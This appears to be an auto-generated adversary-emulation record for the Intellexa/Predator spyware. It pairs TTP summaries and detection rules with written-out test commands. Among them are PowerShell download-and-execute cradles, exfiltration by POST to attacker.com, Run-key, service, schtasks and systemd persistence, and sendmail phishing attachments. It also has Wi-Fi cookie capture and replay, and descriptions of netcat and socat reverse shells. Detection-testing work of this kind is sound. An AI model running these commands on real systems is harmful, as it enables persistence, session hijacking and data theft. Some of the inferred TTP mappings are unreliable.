extracted_ttps.description: The attackers may have used command-line tools like 'at', 'ping', 'reg', and 'sC' to execute system commands and install malware.
The use of commands such as 'at', 'ping', 'reg', and 'sC' suggests the use of a command and scripting interpreter

The attackers may have used social engineering to trick users into executing malicious code, such as opening a malicious link or attachment, which could lead to the installation of spyware like Intellexa and Cytrox.
Intellexa's software can be used to conduct surveillance operations targeting phone number prefixes other than their customers' country of origin and possibly their jurisdiction
Intellexa's Predator spyware persists on iOS and Android devices even after rebooting, indicating a high level of persistence and evasion capabilities
Intellexa develops new exploit chains as initial attack vectors, utilizing the time between Android OS beta versions and general availability
The use of tools like 'at' and 'ping' suggests the use of command and scripting interpreters to execute commands and interact with the system
Intellexa hired an iOS expert vulnerability researcher to integrate the implant with the exploit chain to deploy it reliably on iOS devices
The Alien/Predator implants are written in Python, which can easily be updated and deployed on the fly via a customer’s infrastructure
Intellexa obtained and integrated a new fully operational exploit chain into their solution after their Android previous one was patched
The attackers used command line tools like 'at' and 'ping' to execute commands
The detection of 'reg' suggests that the spyware may be modifying the registry to achieve persistence
The text does not explicitly mention phishing, but the fact that Intellexa's spyware is used for surveillance operations suggests that phishing may be used as an initial access vector
Exploitation of original vulnerability during the boot process by loading a malicious HTML page stored locally
Exploit brokers and exploit research companies sell full or partial exploit chains as a subscription model
Intellexa and Cytrox provide commercial spyware solutions that can be used for surveillance operations
The attackers used zero-click exploits to gain initial access to the device
The attackers modified the system image to survive a factory reset
Introduction of a new Android persistence mechanism based on boot survivability
The attackers used Wi-Fi interception to hijack browser sessions
Detected Create or Modify System Process activity via NLP pattern matching
Detected Application Layer Protocol activity via NLP pattern matching
Detected Exfiltration Over C2 Channel activity via NLP pattern matching
Detected Exploit Public-Facing Application activity via NLP pattern matching
Detected Archive Collected Data activity via NLP pattern matching

rules.title: Command and Scripting Interpreter Detection
rules.description: Detects the use of command-line tools like 'at', 'ping', 'reg', and 'sC' to execute system commands and install malware

rules.title: Detection: User Execution
rules.description: The attackers may have used social engineering to trick users into executing malicious code, such as opening a malicious link or attachment, which could lead to the installation of spyware like Intell

rules.title: Exploit Public-Facing Application (T1190) - iOS Implant Detection
rules.description: Detects potential exploitation of public-facing applications by identifying iOS implant and exploit chain indicators
falsepositives: Legitimate iOS development or testing tools
False positives may occur when users run iOS-related processes or commands

rules.title: Exploit Public-Facing Application (Intellexa Exploit Chain)
rules.description: Detects exploitation of public-facing applications using the Intellexa exploit chain, which was integrated after the Android exploit chain was patched
falsepositives: False positives from applications using 'exploit' in their command-line arguments for non-malicious purposes

rules.title: Detection: Modify Registry
rules.description: The detection of 'reg' suggests that the spyware may be modifying the registry to achieve persistence

rules.title: Detection: Phishing
rules.description: The text does not explicitly mention phishing, but the fact that Intellexa's spyware is used for surveillance operations suggests that phishing may be used as an initial access vector

rules.title: Use of Commercial Surveillance Tools
rules.description: Detects the use of commercial surveillance tools such as Intellexa and Cytrox
falsepositives: Legitimate processes containing 'Intellexa' or 'Cytrox' in their names or command lines

rules.title: Modify System Image
rules.description: Detects modification of system image to survive a factory reset

rules.title: Boot or Logon Initialization Scripts
rules.description: Detection of Android boot or logon initialization scripts for persistence

rules.title: Detection: Browser Session Hijacking
rules.description: The attackers used Wi-Fi interception to hijack browser sessions

rules.title: Create or Modify System Process via Suspicious Parent Processes
rules.description: Detects Create or Modify System Process activity via suspicious parent processes and command line patterns
falsepositives: Legitimate system processes spawned by suspicious parent processes
Administrative tasks that involve creating or modifying system processes

rules.title: Detection: Application Layer Protocol
rules.description: Detected Application Layer Protocol activity via NLP pattern matching

rules.title: Detection: Exfiltration Over C2 Channel
rules.description: Detected Exfiltration Over C2 Channel activity via NLP pattern matching

rules.title: Archive Collected Data Detection
rules.description: Detects Archive Collected Data activity via process creation events

attacks.command: sc.exe create EvilService binPath= "cmd.exe /c echo 'malicious command' > %TEMP%\svc.txt" start= auto
attacks.description: Creates a Windows service using sc.exe with a command that writes a test string to a file in %TEMP%.
attacks.expected_behavior: Creates a service named 'EvilService' that, when started, writes 'malicious command' to %TEMP%\svc.txt. Requires administrator privileges to create services.

attacks.description: Adds a persistent startup entry via the registry that runs a benign command on user login.
attacks.expected_behavior: Adds a registry key to run a command at user login. The command pings localhost and logs output to %TEMP%\pinglog.txt. No admin rights needed for HKCU.

attacks.command: powershell -Command "try { $wc = New-Object Net.WebClient; $wc.Proxy.Credentials = [Net.CredentialCache]::DefaultNetworkCredentials; $data = $wc.DownloadData('http://example.com/calc.txt'); $decoded = [Text.Encoding]::Unicode.GetString($data); $path = '$env:TEMP\debug.bat'; $decoded | Out-File -FilePath $path -Encoding ASCII -Force; cmd.exe /c $path } catch { }"
attacks.description: Downloads a text file containing a benign command (e.g., 'calc.exe') and executes it via cmd.
attacks.expected_behavior: Attempts to download a file from a benign URL (example.com), saves it as debug.bat in %TEMP%, and executes it. Uses built-in .NET WebClient for download. The remote content is assumed to be 'calc.exe' for testing. Execution may fail if no network, but safe fallbacks prevent crashes.

attacks.description: Schedule a command to run in the future using the 'at' command to achieve delayed execution.
attacks.expected_behavior: The 'at' daemon will execute the 'id' command one minute after scheduling. Output is typically mailed to the user or logged, depending on system configuration.

attacks.description: Use command substitution in 'ping' to exfiltrate the hostname by making a DNS lookup to an attacker-controlled domain.
attacks.expected_behavior: The system resolves the constructed domain (e.g., 'webserver.attacker.com') via DNS, which can be monitored by the attacker to capture the hostname. The ping fails, but the DNS query occurs.

attacks.description: Decode and execute a base64-encoded command (e.g., 'id') using bash to simulate obfuscated payload execution.
attacks.expected_behavior: The base64 string 'aWQ=' decodes to 'id', which is then executed by bash, outputting the current user's identity. This simulates execution of encoded malicious commands.

attacks.description: Download and execute a batch script using certutil, simulating execution of a user-downloaded file.
attacks.expected_behavior: Downloads a file (simulated) to TEMP and executes it. In real attacks, this could launch malware. Here, if the file existed, it would run in the user context.

attacks.description: Create a batch file that runs notepad.exe and execute it, simulating user execution of a seemingly legitimate script.
attacks.expected_behavior: Creates a batch file in TEMP that starts notepad and runs it via cmd. Mimics execution of a fake update script.

attacks.command: powershell -Command "try { $content = 'cmd /c start calc.exe'; Set-Content -Path '$env:TEMP\task.ps1' -Value $content -Force; Start-Process powershell.exe -ArgumentList '-ExecutionPolicy Bypass -File $env:TEMP\task.ps1' -WindowStyle Hidden } catch { }"
attacks.description: Write a PowerShell script to disk that launches calc.exe and execute it silently, simulating stealthy user execution of a malicious script.
attacks.expected_behavior: Creates a script in TEMP that runs calc.exe and executes it in a hidden window. Simulates hidden execution of a malicious payload via social engineering.

attacks.command: echo 'echo This is a test payload' > $HOME/.cache/update.sh && chmod +x $HOME/.cache/update.sh && $HOME/.cache/update.sh
attacks.description: Simulates user executing a malicious script downloaded to a hidden directory. Basic variant using common shell commands.
attacks.expected_behavior: Creates a test script in a hidden user directory, makes it executable, and runs it. Output: 'This is a test payload'. No system impact.

attacks.description: Intermediate variant: simulates downloading and executing a script from a remote server. Uses common Linux tools (curl, sh).
attacks.expected_behavior: Attempts to download a script to a runtime directory and execute it. Will fail silently if network is unreachable or file is missing. No payload is actually harmful.

attacks.description: Download a file from a remote server using certutil, simulating retrieval of an exploit payload.
attacks.expected_behavior: Attempts to download a file from the specified URL to the user's TEMP directory. Fails silently if network is unreachable or server is down. Uses built-in certutil for stealth.

attacks.description: Download and execute a file using certutil and start, simulating post-exploitation payload execution.
attacks.expected_behavior: Downloads a file and attempts to execute it. The 'start /b' runs it without opening a new window. This simulates execution of an exploit-delivered payload. Safety risk is high due to execution semantics, but benign in test if server returns harmless file.

attacks.command: powershell -Command "try { $web = New-Object Net.WebClient; $data = [Text.Encoding]::UTF8.GetBytes('test exploit data'); $web.UploadData('http://192.168.1.100/log', 'POST', $data) } catch { }"
attacks.description: Send data to a remote server using PowerShell WebClient, simulating exfiltration or beaconing after exploitation.
attacks.expected_behavior: Attempts to POST test data to a remote endpoint. Simulates post-exploit communication. Uses only built-in .NET classes via PowerShell, within safe usage (no reflection). Errors are suppressed to mimic stealthy behavior.

attacks.description: Basic probe of a public-facing CGI endpoint to check for presence of a potentially vulnerable interface
attacks.expected_behavior: Sends a GET request to a local CGI endpoint and saves response to /tmp/curl_out.txt. Simulates reconnaissance of a public-facing application.

attacks.command:
echo -e "GET /phpmyadmin/index.php?target=phpinfo.php%253f HTTP/1.1
Host: localhost:8080
Connection: close

" | nc localhost 8080 > /tmp/exploit_test.out 2>&1
attacks.description: Intermediate simulation of a path traversal attempt against a public-facing PHP application using raw HTTP via netcat
attacks.expected_behavior: Sends a crafted HTTP GET request with encoded path traversal to a local web service. Output saved to /tmp/exploit_test.out. Simulates exploitation attempt of a known vulnerability pattern.

attacks.description: Advanced simulation of reverse shell execution via base64-decoded command, modeling post-exploitation behavior after compromising a public-facing app
attacks.expected_behavior: Attempts to decode and execute a reverse shell command in the background. Since no listener exists, connection fails. Logs errors to /tmp/shell_err.log. Simulates payload execution after successful exploit.

attacks.description: Simulates downloading an exploit payload from a remote server using built-in certutil
attacks.expected_behavior: Downloads a file from a mock remote server to the user's temp directory. In a real attack, this would be an exploit binary targeting a public-facing service.

attacks.description: Executes a downloaded mock exploit binary against a local service to simulate exploitation of a public-facing application
attacks.expected_behavior: Attempts to run a local binary with arguments simulating an exploit against a service. No actual exploit occurs; used for detection testing.

attacks.description: Simulates staged exploit execution using PowerShell to write payload and trigger processing via a vulnerable service mock
attacks.expected_behavior: Creates a staging directory, writes a benign test string, and 'executes' it using cmd. Simulates multi-stage exploit behavior without malicious payload.

attacks.description: Basic exploitation attempt via crafted GET request to a CGI endpoint, simulating a command injection probe.
attacks.expected_behavior: Sends a GET request to a local CGI script with a URL-encoded command string. Expected to trigger log entries or responses if the service is vulnerable.

attacks.description: Intermediate exploitation attempt using POST data to interact with a vulnerable PHP endpoint, simulating form-based injection.
attacks.expected_behavior: Posts encoded data to a local PHP endpoint. Simulates exploitation of a form processor vulnerable to OS command injection. No actual payload executed.

attacks.description: Advanced exploitation simulating Shellshock-like attack using malicious HTTP headers targeting vulnerable CGI services.
attacks.expected_behavior: Sends a GET request with specially crafted headers that emulate Shellshock exploitation. If the service uses a vulnerable shell, it may execute unintended commands. In safe environments, only logs are affected.

attacks.command: reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "Updater" /t REG_SZ /d "cmd.exe /c echo Persistent & pause" /f
attacks.description: Basic registry modification to achieve persistence by adding a value to the Run key under HKCU.
attacks.expected_behavior: Adds a registry entry that runs a harmless command on user login. The 'Updater' value will appear in the Run key and execute cmd.exe with a message.

attacks.description: Intermediate registry modification using HKLM for system-wide persistence, requires admin rights.
attacks.expected_behavior: Creates a registry entry in the local machine Run key that launches Notepad at system startup. This change affects all users and requires elevated privileges.

attacks.command: powershell -Command "try { $cmd = 'reg add \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce\" /v \"TempTask\" /t REG_SZ /d \"cmd.exe /c echo Hello\\u0026pause\" /f'; Start-Process powershell -ArgumentList \"-Command $cmd\" -WindowStyle Hidden } catch { }"
attacks.description: Advanced obfuscated registry modification using PowerShell to execute a hidden reg command via Start-Process.
attacks.expected_behavior: Executes a hidden PowerShell window that runs a reg add command to set a RunOnce entry. This simulates stealthy persistence with command obfuscation and no visible console.

attacks.description: Appends a conditional execution check to the user's bashrc for persistence on shell startup
attacks.expected_behavior: Adds a line to ~/.bashrc that checks for and sources a non-existent test file on shell start. No actual malware is executed.

attacks.description: Adds a cron job that executes a script at reboot for persistence
attacks.expected_behavior: Installs a user-level cron job that runs on reboot and checks for a local test script. No payload is present, so no action occurs.

attacks.description: Download a simulated malicious payload using certutil, a built-in Windows binary often abused in phishing follow-up.
attacks.expected_behavior: Attempts to download a file from a remote server to the user's temp directory. Fails silently if network is unreachable or URL is invalid. Uses built-in Windows tool for stealth.

attacks.description: Execute the downloaded payload from the temp directory using cmd.exe.
attacks.expected_behavior: Launches the downloaded executable from the temp folder. In real attacks, this would run malware; here it would fail safely if file doesn't exist or is benign.

attacks.command: powershell -Command "mkdir '$env:APPDATA\\Microsoft\\Windows\\Start Menu\\Programs\\Startup' -ErrorAction SilentlyContinue; Copy-Item '%TEMP%\\update.exe' '$env:APPDATA\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\svchost.exe' -ErrorAction SilentlyContinue"
attacks.description: Copy the payload to the user's startup folder to achieve persistence after phishing payload execution.
attacks.expected_behavior: Creates the startup directory if missing and copies the simulated payload into it under a disguised name. Ensures execution on user login. Uses built-in PowerShell only where necessary (directory creation and copy).

attacks.command:
echo -e '#!/bin/bash
echo "Compromised"' > /tmp/malicious.sh && chmod +x /tmp/malicious.sh && printf "Subject: Important Update
From: admin@example.com
To: victim@example.com
MIME-Version: 1.0
Content-Type: multipart/mixed; boundary="BOUNDARY"

--BOUNDARY
Content-Type: text/plain; charset="UTF-8"

Please see the attached update.

--BOUNDARY
Content-Type: application/octet-stream; name="update.sh"
Content-Transfer-Encoding: base64
Content-Disposition: attachment; filename="update.sh"

$(base64 /tmp/malicious.sh)
--BOUNDARY--
" | /usr/sbin/sendmail -t
attacks.description: Creates a simple malicious bash script, encodes it in base64, and sends it as an email attachment via sendmail to simulate a phishing email with a malicious attachment.
attacks.expected_behavior: An email is placed in the local mail queue addressed to victim@example.com, containing the base64‑encoded malicious script as an attachment. The script prints "Compromised" when executed.

attacks.command:
while true; do echo -e "HTTP/1.1 200 OK Content-Type: text/html

Security Update

" | nc -l -p 8080; done & echo -e "Subject: Security Update Required From: security@example.com To: victim@example.com Please review the update at http://$(hostname -I | awk '{print $1}'):8080" | /usr/sbin/sendmail -t
attacks.description: Starts a lightweight netcat HTTP server that serves a malicious HTML page with JavaScript to exfiltrate cookies, then emails the victim a link to the hosted page.
attacks.expected_behavior: A background netcat process listens on port 8080, delivering the malicious HTML when accessed. An email containing the URL is queued for the victim, encouraging them to click the link and trigger the script.

attacks.command:
echo -e "

Login Required

" > /tmp/phish.html && openssl req -newkey rsa:2048 -nodes -keyout /tmp/phish.key -x509 -days 1 -out /tmp/phish.crt -subj "/CN=phish.local" && openssl s_server -quiet -key /tmp/phish.key -cert /tmp/phish.crt -port 8443 -WWW & echo -e "Subject: Urgent Account Verification From: admin@example.com To: victim@example.com Please verify your account at https://$(hostname -I | awk '{print $1}'):8443" | /usr/sbin/sendmail -t
attacks.description: Generates a self‑signed TLS certificate, serves a phishing login page over HTTPS using OpenSSL's s_server, and emails the victim a link to the secure page, representing an advanced phishing scenario.
attacks.expected_behavior: A background OpenSSL server listens on port 8443, delivering the crafted login page over HTTPS. An email with the HTTPS link is queued, prompting the victim to enter credentials which would be posted to the attacker’s server.

attacks.description: Download a staged executable using certutil, mimicking initial payload retrieval by commercial spyware.
attacks.expected_behavior: Attempts to download a file from a remote URL to the user's TEMP directory. Fails safely if network is unreachable or file is blocked.

attacks.command: powershell -Command "mkdir '%TEMP%\WindowsService' -ErrorAction SilentlyContinue; $data = 'fake config or exfiltrated data'; $data | Out-File -FilePath '%TEMP%\WindowsService\diag.bin' -Force; Compress-Archive -Path '%TEMP%\WindowsService\*' -DestinationPath '%TEMP%\diag.zip' -Force"
attacks.description: Simulate data collection and compression before exfiltration, as performed by surveillance tools.
attacks.expected_behavior: Creates a directory in TEMP, writes a benign test string, and compresses it into a ZIP archive.

attacks.command: sc.exe create SpyService binPath= "%TEMP%\svchost_update.exe" start= auto & sc.exe start SpyService
attacks.description: Create and start a Windows service pointing to a suspicious binary path, simulating persistence via a surveillance tool.
attacks.expected_behavior: Creates a service named 'SpyService' that runs a binary from TEMP. Fails without admin rights. Does not execute real malware.

attacks.command: wget -O /tmp/surveillance_agent 'http://example.com/test_agent' 2>/dev/null || echo 'Test agent not available, using mock binary' > /tmp/surveillance_agent && chmod +x /tmp/surveillance_agent && /tmp/surveillance_agent --headless --config /tmp/.agent.cfg
attacks.description: Download and execute a mock surveillance agent binary from a remote server with headless configuration
attacks.expected_behavior: Attempts to download a binary; if unavailable, creates a mock file. Makes it executable and runs it with configuration. Simulates initial execution stage of commercial spyware.

attacks.command:
echo '[Unit]
Description=System Sensor Agent
[Service]
ExecStart=/tmp/surveillance_agent --daemon
Restart=always
User=root
[Install]
WantedBy=multi-user.target' > /tmp/sensor.service && sudo mv /tmp/sensor.service /etc/systemd/system/sensor.service && sudo systemctl enable sensor.service && sudo systemctl start sensor.service
attacks.description: Install a mock surveillance agent as a persistent systemd service
attacks.expected_behavior: Creates a service unit file for persistence, moves it to systemd directory, and enables starts the service. Simulates persistence mechanism used by commercial surveillance tools.

attacks.description: Creates a mock recovery script in a temporary location to simulate modification of system recovery artifacts
attacks.expected_behavior: A batch file named winre_wipe.bat is created in %TEMP%\_recovery with a benign echo statement. No system recovery is actually modified.

attacks.description: Modifies the boot configuration data to point recovery to a custom GUID, simulating hijacking of recovery process
attacks.expected_behavior: bcdedit attempts to set a non-existent recovery sequence GUID. The command will fail unless the GUID exists, but demonstrates the technique. No actual recovery image is modified.

attacks.command: powershell -Command "mkdir "$env:TEMP\_winre" -ErrorAction SilentlyContinue; $content = '/* malicious hook placeholder */'; Set-Content -Path "$env:TEMP\_winre\script.ps1" -Value $content -Force; Write-Output 'Simulated system image modification via recovery script injection'"
attacks.description: Simulates injection of a script into a recovery image by creating a mock script in a temporary directory
attacks.expected_behavior: Creates a directory %TEMP%\_winre and writes a benign placeholder script. Simulates attacker's ability to plant code in recovery artifacts.

attacks.description: Adds a hook script to the initramfs build process that copies a benign payload to /tmp during early boot and regenerates the initramfs.
attacks.expected_behavior: On the next reboot, the initramfs executes the hook, resulting in the file /tmp/persistence being created. The system continues to boot normally, demonstrating persistence via a modified system image.

attacks.command: reg add "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" /v "UpdateCheck" /t REG_SZ /d "cmd.exe /c echo User logged in at %date% %time% >> \"%TEMP%\\session.log\"" /f
attacks.description: Adds a logon persistence entry via the current user's Registry Run key that logs timestamp on each login using cmd.exe.
attacks.expected_behavior: A registry entry is created under HKCU\Software\Microsoft\Windows\CurrentVersion\Run named 'UpdateCheck'. On each user logon, a line with the current date and time is appended to %TEMP%\session.log.

attacks.command: schtasks /create /tn "SystemMaintenance" /tr "cmd.exe /c echo Maintenance run >> \"%TEMP%\\maintenance.log\"" /sc onlogon /rl limited /f
attacks.description: Creates a scheduled task that runs at user logon with limited privileges to append a log entry.
attacks.expected_behavior: A scheduled task named 'SystemMaintenance' is registered to run at user logon. It executes a harmless command that writes a line to %TEMP%\maintenance.log. Runs under the user context without elevated privileges.

attacks.command: powershell -Command "mkdir '%APPDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup' -ErrorAction SilentlyContinue; Set-Content -Path '%APPDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\sync.bat' -Value 'cmd.exe /c whoami >> \"%TEMP%\\startup_user.txt\"' -Force"
attacks.description: Drops a batch script into the current user's Startup folder to execute on next logon, logging the username.
attacks.expected_behavior: Creates the Startup folder if missing, then writes a batch file named 'sync.bat' that runs 'whoami' and appends output to %TEMP%\startup_user.txt upon user logon. The script executes automatically when the user logs in.

attacks.description: Appends a command to the user's .bashrc so that a message is logged each time the user starts a new shell session.
attacks.expected_behavior: When the user opens a new terminal or logs in, the appended echo command runs and appends a line to $HOME/persistence.log.

attacks.command:
printf "[Unit]
Description=Root persistence service
[Service]
ExecStart=/bin/sh -c 'echo "Persistence test: systemd system service" >> /root/persistence.log'
[Install]
WantedBy=multi-user.target
" > /etc/systemd/system/persist-root.service && systemctl daemon-reload && systemctl enable persist-root.service && systemctl start persist-root.service
attacks.description: Installs a system‑wide systemd service that runs as root at boot, logging a test message to /root/persistence.log.
attacks.expected_behavior: On the next boot (or immediately after start), systemd runs the service and writes a line to /root/persistence.log, demonstrating persistence at the system level.

attacks.description: Start a Wi‑Fi traffic capture and write the raw trace to a temporary ETL file.
attacks.expected_behavior: The netsh utility begins capturing all network traffic on the machine and stores it in %TEMP%\wifi_capture.etl until stopped.

attacks.description: Stop the capture and extract any lines containing HTTP Cookie headers from the ETL file using findstr.
attacks.expected_behavior: The trace is halted, then findstr scans the capture file for the pattern "Cookie: " and writes matching lines to %TEMP%\cookies.txt.

attacks.description: Use PowerShell to search the captured traffic for Cookie strings and output them to a text file.
attacks.expected_behavior: Select-String scans the ETL file for the literal "Cookie:" pattern; each matching line is written to %TEMP%\cookies.txt, providing potential session tokens.

attacks.description: Capture a limited number of HTTP packets on the wlan0 interface and filter for any Cookie headers.
attacks.expected_behavior: The command prints any HTTP Cookie headers observed in the captured traffic to stdout.

attacks.command: airmon-ng start wlan0 && airodump-ng --bssid 00:11:22:33:44:55 -c 6 -w /tmp/cap --output-format pcap wlan0mon && tshark -r /tmp/cap-01.pcap -Y http.cookie -T fields -e http.cookie
attacks.description: Enable monitor mode on wlan0, capture traffic from a specific Wi‑Fi BSSID on channel 6, then extract HTTP cookie values from the resulting pcap file.
attacks.expected_behavior: The command outputs a list of cookie strings that were present in the captured Wi‑Fi traffic.

attacks.command: sudo iw dev wlan0 set type monitor && sudo ifconfig wlan0 up && sudo tcpdump -i wlan0 -s 0 -c 500 -w /tmp/session.pcap 'tcp port 80' && sudo tshark -r /tmp/session.pcap -Y http.cookie -T fields -e http.cookie > /tmp/stolen_cookies.txt && while read -r cookie; do curl -b "${cookie}" https://example.com/profile -s -o /dev/null; done < /tmp/stolen_cookies.txt
attacks.description: Switch wlan0 to monitor mode, capture 500 HTTP packets, extract cookies to a file, then replay each cookie with curl to demonstrate a session hijack against a test site.
attacks.expected_behavior: Cookies are written to /tmp/stolen_cookies.txt and curl silently makes a request to https://example.com/profile using each cookie, showing that the session can be reused.

attacks.command: sc.exe create TestService binPath= "cmd.exe /c echo test > %TEMP%\persistence_test.txt" start= auto
attacks.description: Creates a Windows service named 'TestService' that runs a benign command on startup using sc.exe
attacks.expected_behavior: Service 'TestService' is created in SCM database. On system boot or manual start, it writes 'test' to a file in %TEMP%. Requires elevated privileges to create service.

attacks.command: reg.exe add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v "Updater" /t REG_SZ /d "cmd.exe /c echo auto-run test > %TEMP%\autorun_test.txt" /f
attacks.description: Adds a registry entry to execute a command at user logon via the Run key
attacks.expected_behavior: Registry value 'Updater' is added to the local machine Run key. The command executes each time a user logs in, creating a test file in %TEMP%. Requires admin rights to modify HKLM.

attacks.command: schtasks.exe /create /tn \Microsoft\Windows\UpdateOrchestrator\TestScan /sc ONSTART /ru SYSTEM /rl HIGHEST /tr "cmd.exe /c echo scheduled task test > %TEMP%\schtasks_test.txt"
attacks.description: Creates a scheduled task that runs a benign command when the system starts
attacks.expected_behavior: Scheduled task 'TestScan' is registered to run at system startup as SYSTEM. It creates a test file in %TEMP%. Visible in Task Scheduler. Requires admin privileges to create task with SYSTEM context.

attacks.description: Create a simple bash script in /tmp and schedule it via the current user's crontab to run every minute.
attacks.expected_behavior: The script /tmp/persist.sh is executed each minute, appending the line "persistence test" to /tmp/persist.log. The crontab entry persists across reboots for the user.

attacks.command:
echo -e '#!/bin/bash
echo "systemd persistence test" >> /var/log/persist.log' > /usr/local/bin/persist.sh && chmod +x /usr/local/bin/persist.sh && echo -e '[Unit]
Description=Test Persistence Service
After=network.target

[Service]
Type=simple
ExecStart=/usr/local/bin/persist.sh

[Install]
WantedBy=multi-user.target' > /etc/systemd/system/persist.service && systemctl daemon-reload && systemctl enable persist.service && systemctl start persist.service
attacks.description: Create a systemd service that runs a benign script at boot, then enable and start the service.
attacks.expected_behavior: The service 'persist.service' is registered with systemd, starts immediately, and will be started automatically on subsequent boots, writing "systemd persistence test" to /var/log/persist.log each time it runs.

attacks.command: echo -e '#!/bin/bash\necho "rc.local persistence test" >> /var/log/persist_rc.log' > /usr/local/bin/persist_rc.sh && chmod +x /usr/local/bin/persist_rc.sh && mkdir -p /etc && (grep -qxF '/usr/local/bin/persist_rc.sh' /etc/rc.local 2>/dev/null || echo '/usr/local/bin/persist_rc.sh' >> /etc/rc.local) && chmod +x /etc/rc.local
attacks.description: Append execution of a benign script to /etc/rc.local so it runs during system init.
attacks.expected_behavior: On the next boot, /etc/rc.local will invoke /usr/local/bin/persist_rc.sh, which appends "rc.local persistence test" to /var/log/persist_rc.log, providing persistence via the legacy init mechanism.

attacks.description: Download a benign text file over HTTP using certutil, an built‑in Windows utility.
attacks.expected_behavior: The file benign.txt is saved to the user's temporary directory, generating HTTP GET traffic to example.com.

attacks.description: Use bitsadmin to download a binary file over HTTP in the background.
attacks.expected_behavior: Bitsadmin creates a background download job, retrieves payload.bin from example.com, and stores it in the temporary directory, producing HTTP GET traffic.

attacks.description: Send a small data payload to a remote server via HTTP POST using PowerShell's Invoke-WebRequest.
attacks.expected_behavior: PowerShell issues an HTTP POST request to example.com/collect with the body 'testdata', demonstrating outbound application‑layer communication.

attacks.description: Basic reverse TCP C2 channel using netcat; connects to a remote listener on port 4444.
attacks.expected_behavior: Attempts to open a TCP connection to 203.0.113.10:4444; if the remote endpoint is listening, it can send commands back to the compromised host.

attacks.description: Intermediate C2 using HTTP POST to exfiltrate a simple heartbeat message.
attacks.expected_behavior: Performs an HTTP POST request to the specified URL, sending the string "data=heartbeat"; the remote server can log or process the received data.

attacks.description: Advanced reverse shell over TLS using socat; establishes an encrypted channel to a remote listener on port 443.
attacks.expected_behavior: Creates a TLS-encrypted connection to 203.0.113.10:443 and, upon successful handshake, spawns an interactive bash shell whose I/O is tunneled over the encrypted channel.

attacks.description: Simulates exfiltration by uploading a test file using certutil.exe, a built-in Windows binary for transferring data over HTTP.
attacks.expected_behavior: Creates a small test file in the TEMP directory and attempts to upload it to a local HTTP endpoint using certutil. Fails safely if no server is running.

attacks.description: Compresses a test data file and sends it via HTTP POST to simulate data exfiltration over a C2 channel using PowerShell.
attacks.expected_behavior: Creates a ZIP archive of the test file and attempts to upload it to a specified URI. The request fails silently if the endpoint is unreachable.

attacks.command: powershell -Command "$data = Get-Content $env:TEMP\exfil_data.txt; $encoded = [Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes($data)); Invoke-WebRequest -Uri http://attacker.com/exfil -Method POST -Body $encoded -ContentType 'text/plain' -ErrorAction SilentlyContinue"
attacks.description: Reads a test file, encodes its contents in Base64, and sends it in the body of an HTTP POST request to simulate stealthy exfiltration.
attacks.expected_behavior: Reads local test data, encodes it to avoid plaintext detection, and sends it via HTTP POST. Operation is non-persistent and limited to TEMP files.

attacks.description: Basic exfiltration: streams the /etc/passwd file to a remote C2 listener using netcat.
attacks.expected_behavior: The contents of /etc/passwd are sent over a TCP connection to 192.168.1.100 on port 4444; the remote listener receives the data.

attacks.description: Intermediate exfiltration: compresses the syslog file, encodes it in base64, and transmits it via netcat to the C2 server.
attacks.expected_behavior: A compressed, base64‑encoded version of /var/log/syslog is streamed to the remote host at 192.168.1.100:4444, where it can be decoded and extracted.

attacks.description: Advanced exfiltration: uses an authenticated SSH session (SCP) to copy the user's SSH key directory to the remote C2 server, with compression enabled.
attacks.expected_behavior: All files under $HOME/.ssh are securely transferred over SSH to /tmp/exfil_ssh_keys on the remote host 192.168.1.100; the remote side receives the files for later use.

attacks.description: Basic archive of a single test file (sample.txt) into a ZIP file (data.zip) located in the temporary directory.
attacks.expected_behavior: Creates data.zip containing sample.txt in %TEMP%; no output is displayed if successful.

attacks.description: Intermediate archive that collects all .log files from the user's AppData folder and compresses them into logs.zip.
attacks.expected_behavior: Creates logs.zip in %TEMP% containing every .log file found in %APPDATA%; overwrites any existing logs.zip.

attacks.description: Advanced workflow: archives all files from the user's Documents folder, encodes the resulting ZIP to Base64 for simple obfuscation, then deletes the original ZIP.
attacks.expected_behavior: Creates docs.zip, converts it to docs.b64 (Base64 text file) in %TEMP%, and removes the original ZIP; no visible errors if steps succeed.

attacks.description: Create a gzip-compressed tar archive of the /tmp/collected_data directory.
attacks.expected_behavior: A file named archive.tar.gz is created in /tmp containing the contents of /tmp/collected_data.

attacks.description: Recursively zip the collected data directory with a simple password for basic encryption.
attacks.expected_behavior: A password-protected archive file /tmp/archive.zip is created containing all files from /tmp/collected_data.

attacks.description: Stream a gzip-compressed tar archive and split it into 5 MiB chunks for exfiltration or storage constraints.
attacks.expected_behavior: Multiple files named archive_part_aa, archive_part_ab, … are created in /tmp, each up to 5 MiB, representing the split archive of /tmp/collected_data.
